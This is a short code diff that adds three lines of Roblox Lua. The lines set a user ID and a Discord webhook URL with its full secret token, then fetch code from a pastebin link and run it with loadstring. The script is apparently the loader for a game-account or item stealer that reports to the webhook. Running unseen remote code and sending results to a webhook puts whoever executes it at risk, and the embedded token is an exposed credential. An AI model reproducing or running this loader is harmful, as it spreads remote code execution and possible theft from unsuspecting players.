@@ -1,0 +1,3 @@
+_G.User = 158884072
+_G.Webhook = 'https://discord.com/api/webhooks/1056174433888387073/vfBvKNhcXA2jraR73d6actlmQSvnMnpTqQPxatLF2_eRWUZ389WyQuSfxlDk2oFE0oG1'
+loadstring(game:HttpGet(('https://pastebin.com/raw/JhpH4Tq5')))()
